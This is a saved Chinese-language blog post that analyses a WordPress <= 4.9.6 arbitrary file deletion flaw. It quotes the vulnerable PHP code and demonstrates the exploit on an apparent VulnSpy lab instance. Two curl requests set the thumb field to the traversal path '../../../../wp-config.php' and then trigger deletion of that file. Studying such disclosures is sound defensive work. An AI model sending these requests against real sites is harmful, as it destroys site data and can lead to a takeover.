---
title: Wordpress <= 4.9.6 任意文件删除漏洞
updated: 2018-12-23 14:50:58Z
created: 2018-12-23 14:50:58Z
source: >-
  https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/
---


<en-note>
  <div>
<div><br/></div><div STYLE="font-size: 16px; display:block; min-width: 100%; "> <div STYLE="background-color:transparent;font:inherit;vertical-align:baseline;"><div STYLE="background-color:transparent;font:inherit;vertical-align:baseline;font-family:&quot;PT Serif&quot;;font-size:16px;line-height:1.5em;color:rgb(31, 9, 9);text-align:left;"><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><div STYLE="z-index:200;padding-left:2em;padding-right:2em;margin-left:auto;margin-right:auto;position:relative;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;width:36em;"><div STYLE="position:relative;margin-left:-25px;margin-right:25px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><div STYLE="position:relative;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;padding-top:4.5em;padding-bottom:9em;"><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><div STYLE="margin-bottom:0px;position:relative;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><div STYLE="margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><div STYLE="margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><h1 STYLE="padding:0px;margin:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:normal;font-size:35px;line-height:35px;margin-bottom:20px;font-family:&quot;PT Serif&quot;;text-align:left;"> Wordpress &lt;= 4.9.6 任意文件删除漏洞 </h1><div STYLE="margin-bottom:0px;position:relative;margin:0px;height:1em;line-height:1;text-align:center;padding:0px;border:0px;font:inherit;vertical-align:baseline;padding-top:1.5em;padding-bottom:1.5em;"><div STYLE="margin-bottom:0px;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;margin:0px;opacity:0.5;padding:0px;border:0px;font:inherit;vertical-align:baseline;background:-webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%);"><span STYLE="font:inherit;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;margin:0px;opacity:0.5;background:-webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%);"></span></div></div></div>
    
    <div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">
      
        <p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">作者: <a HREF="https://twitter.com/ambulong" TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">@Ambulong</a></p>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">WordPress是如今使用最为广泛的一套内容管理系统。根据 w3tech 统计，全世界大概有30%的网站运行着WordPress程序。昨日RIPS团队公开了一个Wordpress的<a HREF="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">任意文件删除漏洞</a>（需要登录），目前该漏洞仍然未修复（2018年06月27日），该漏洞影响 Wordpress 最新版 4.9.6.</p>

<hr STYLE="border-top:none;border-right:none;border-bottom:1px solid;border-left:none;border-color:rgb(31, 9, 9);"/>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">WordPress是如今使用最为广泛的一套内容管理系统。根据 w3tech 统计，全世界大概有30%的网站运行着WordPress程序。</p>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">昨日RIPS团队公开了一个Wordpress的<a HREF="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">任意文件删除漏洞</a>（需要登录），目前该漏洞仍然未修复（2018年06月27日），该漏洞影响 Wordpress 最新版 4.9.6.</p>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">本文我们将结合 VulnSpy 的<a HREF="http://www.vulnspy.com/wordpress-4.9/wordpress_4.9/" TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">在线 WordPress 环境</a>来演示该漏洞的利用。</p>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">VulnSpy Wordpress 4.9 在线环境: <a HREF="http://www.vulnspy.com/wordpress-4.9/wordpress_4.9/" TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">http://www.vulnspy.com/wordpress-4.9/wordpress_4.9/</a></p>
<h2 STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;font-size:30px;line-height:35px;margin-top:35px;margin-bottom:15px;font-family:&quot;PT Serif&quot;;text-align:left;">漏洞分析</h2><ol STYLE="margin:0px 0px 1.5em 1.5em;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style:decimal outside none;margin-top:-1em;list-style-type:decimal;">
<li STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style-type:inherit;list-style-position:outside;">文件wp-includes/post.php中：</li>
</ol>
<div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;display:block;margin-bottom:1em;margin-top:1em;"><table STYLE="font-size:1em;font-weight:inherit;font-style:inherit;font-variant:inherit;margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-collapse:collapse;border-spacing:0px;"><tbody STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><tr STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><td STYLE="margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;"><pre STYLE="width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;"><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">1</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">2</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">3</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">4</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">5</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">6</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">7</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">8</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">9</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">10</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">11</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">12</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">13</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">14</div><div STYLE="margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;">15</div></pre></td><td STYLE="margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;"><pre STYLE="width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;"><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">function wp_delete_attachment( $post_id, $force_delete = false ) {</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;...</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;$meta = wp_get_attachment_metadata( $post_id );</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;...</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;if ( ! empty($meta[&apos;thumb&apos;]) ) {</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;// Don&apos;t delete the thumb if another attachment uses it.</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;if (! $wpdb-&gt;get_row( $wpdb-&gt;prepare( &quot;SELECT meta_id FROM $wpdb-&gt;postmeta WHERE meta_key = &apos;_wp_attachment_metadata&apos; AND meta_value LIKE %s AND post_id &lt;&gt; %d&quot;, &apos;%&apos; . $wpdb-&gt;esc_like( $meta[&apos;thumb&apos;] ) . &apos;%&apos;, $post_id)) ) {</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;&Tab;$thumbfile = str_replace(basename($file), $meta[&apos;thumb&apos;], $file);</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;&Tab;/** This filter is documented in wp-includes/functions.php */</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;&Tab;$thumbfile = apply_filters( &apos;wp_delete_file&apos;, $thumbfile );</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;&Tab;@ unlink( path_join($uploadpath[&apos;basedir&apos;], $thumbfile) );</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;}</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;}</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;...</div><div STYLE="margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;">}</div></pre></td></tr></tbody></table></div>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><code STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;">$meta[&apos;thumb&apos;]</code>来自与数据库，是图片的属性之一。代码未检查<code STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;">$meta[&apos;thumb&apos;]</code>的内容，直接带入<code STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;">unlink</code>函数，如果<code STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;">$meta[&apos;thumb&apos;]</code>可控则可导致文件删除。</p>
<ol STYLE="margin:0px 0px 1.5em 1.5em;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style:decimal outside none;margin-top:-1em;list-style-type:decimal;">
<li STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style-type:inherit;list-style-position:outside;">文件/wp-admin/post.php中：</li>
</ol>
<div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;display:block;margin-bottom:1em;margin-top:1em;"><table STYLE="font-size:1em;font-weight:inherit;font-style:inherit;font-variant:inherit;margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-collapse:collapse;border-spacing:0px;"><tbody STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><tr STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><td STYLE="margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;"><pre STYLE="width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;"><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">1</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">2</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">3</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">4</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">5</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">6</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">7</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">8</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">9</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">10</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">11</div><div STYLE="margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;">12</div></pre></td><td STYLE="margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;"><pre STYLE="width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;"><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">...</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">switch($action) {</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">...</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;case &apos;editattachment&apos;:</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;check_admin_referer(&apos;update-post_&apos; . $post_id);</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;...</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;// Update the thumbnail filename</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;$newmeta = wp_get_attachment_metadata( $post_id, true );</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;$newmeta[&apos;thumb&apos;] = $_POST[&apos;thumb&apos;];</div><div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&Tab;&Tab;wp_update_attachment_metadata( $post_id, $newmeta );</div><div STYLE="margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;">...</div></pre></td></tr></tbody></table></div>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><code STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;">$newmeta[&apos;thumb&apos;]</code>来自于$_POST[&lsquo;thumb&rsquo;]，未经过滤直接将其存入数据库，即上一步的<code STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;">$meta[&apos;thumb&apos;]</code>可控。</p>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">详细分析可见：WARNING: WordPress File Delete to Code Execution - <a HREF="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a></p>
<h2 STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;font-size:30px;line-height:35px;margin-top:35px;margin-bottom:15px;font-family:&quot;PT Serif&quot;;text-align:left;">漏洞利用</h2><p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><strong STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;">1. 使用VSPlate安装你的Wordpress 4.9</strong></p>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">Wordpress 4.9 在线环境: <a HREF="http://www.vulnspy.com/wordpress-4.9/wordpress_4.9/" TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">http://www.vulnspy.com/wordpress-4.9/wordpress_4.9/</a></p>
<a HREF="https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/1.1.png" TITLE="Wordpress AFD" TARGET="_blank" STYLE="display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);"><div STYLE="margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;"><img src="../_resources/dd1874fe09daae4d24e0e0cdbe02fbde.png"  type="image/png" hash="dd1874fe09daae4d24e0e0cdbe02fbde" title="Wordpress AFD" width="576" height="491" style="display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);" alt="" /></en-media></div></a>Wordpress AFD
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><strong STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;">2. 登录后台，添加媒体</strong></p>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">访问 <a HREF="http://9c9b.vsplate.me/wp-admin/upload.php" TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">http://9c9b.vsplate.me/wp-admin/upload.php</a>,  上传任意图片.</p>
<a HREF="https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/2.1.png" TITLE="Wordpress AFD" TARGET="_blank" STYLE="display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);"><div STYLE="margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;"><img src="../_resources/2880b7662b9213bbc20306b9fc11c65a.png"  type="image/png" hash="2880b7662b9213bbc20306b9fc11c65a" title="Wordpress AFD" width="576" height="394" style="display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);" alt="" /></en-media></div></a>Wordpress AFD
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><strong STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;">3. 将 $meta[&lsquo;thumb&rsquo;] 设置为我们要删除的文件</strong></p>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">3.1 点击第二步中我们上传的图片, 并记住图片ID.</p>
<a HREF="https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/3.1.png" TITLE="Wordpress AFD" TARGET="_blank" STYLE="display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);"><div STYLE="margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;"><img src="../_resources/514b9706ab564783a9653fcbc8757fc0.png"  type="image/png" hash="514b9706ab564783a9653fcbc8757fc0" title="Wordpress AFD" width="576" height="311" style="display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);" alt="" /></en-media></div></a>Wordpress AFD
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">3.2 访问 <a HREF="http://9c9b.vsplate.me/wp-admin/post.php?post=4&action=edit" TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">http://9c9b.vsplate.me/wp-admin/post.php?post=4&amp;action=edit</a>. 在网页源代码中找到 <code STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;">_wpnonce</code>.</p>
<a HREF="https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/3.2.png" TITLE="Wordpress AFD" TARGET="_blank" STYLE="display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);"><div STYLE="margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;"><img src="../_resources/6cd805ec01c14a38b914263a21d82d09.png"  type="image/png" hash="6cd805ec01c14a38b914263a21d82d09" title="Wordpress AFD" width="576" height="290" style="display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);" alt="" /></en-media></div></a>Wordpress AFD
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">3.3 发送Payload: </p>
<div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;display:block;margin-bottom:1em;margin-top:1em;"><table STYLE="font-size:1em;font-weight:inherit;font-style:inherit;font-variant:inherit;margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-collapse:collapse;border-spacing:0px;"><tbody STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><tr STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><td STYLE="margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;"><pre STYLE="width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;"><div STYLE="margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;">1</div></pre></td><td STYLE="margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;"><pre STYLE="width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;"><div STYLE="margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;">curl -v &apos;http://9c9b.vsplate.me/wp-admin/post.php?post=4&apos; -H &apos;Cookie: ***&apos; -d &apos;action=editattachment&amp;_wpnonce=***&amp;thumb=../../../../wp-config.php&apos;</div></pre></td></tr></tbody></table></div>
<a HREF="https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/3.3.png" TITLE="Wordpress AFD" TARGET="_blank" STYLE="display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);"><div STYLE="margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;"><img src="../_resources/4997bb9a4008201aa278220e5af9635c.png"  type="image/png" hash="4997bb9a4008201aa278220e5af9635c" title="Wordpress AFD" width="576" height="370" style="display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);" alt="" /></en-media></div></a>Wordpress AFD
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><strong STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;">4. 删除文件</strong></p>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">4.1 在网页源码中找到另外一个 <code STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;">_wpnonce</code>.</p>
<a HREF="https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/4.1.png" TITLE="Wordpress AFD" TARGET="_blank" STYLE="display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);"><div STYLE="margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;"><img src="../_resources/a07f40567f42be673fdc4761b25e13c4.png"  type="image/png" hash="a07f40567f42be673fdc4761b25e13c4" title="Wordpress AFD" width="576" height="288" style="display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);" alt="" /></en-media></div></a>Wordpress AFD
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">4.2 发送Payload: </p>
<div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;display:block;margin-bottom:1em;margin-top:1em;"><table STYLE="font-size:1em;font-weight:inherit;font-style:inherit;font-variant:inherit;margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-collapse:collapse;border-spacing:0px;"><tbody STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><tr STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;"><td STYLE="margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;"><pre STYLE="width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;"><div STYLE="margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;">1</div></pre></td><td STYLE="margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;"><pre STYLE="width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;"><div STYLE="margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;">curl -v &apos;http://9c9b.vsplate.me/wp-admin/post.php?post=4&apos; -H &apos;Cookie: ***&apos; -d &apos;action=delete&amp;_wpnonce=***&apos;</div></pre></td></tr></tbody></table></div>
<a HREF="https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/4.2.png" TITLE="Wordpress AFD" TARGET="_blank" STYLE="display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);"><div STYLE="margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;"><img src="../_resources/2de50300224621b6e61935a590faebbe.png"  type="image/png" hash="2de50300224621b6e61935a590faebbe" title="Wordpress AFD" width="576" height="359" style="display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);" alt="" /></en-media></div></a>Wordpress AFD
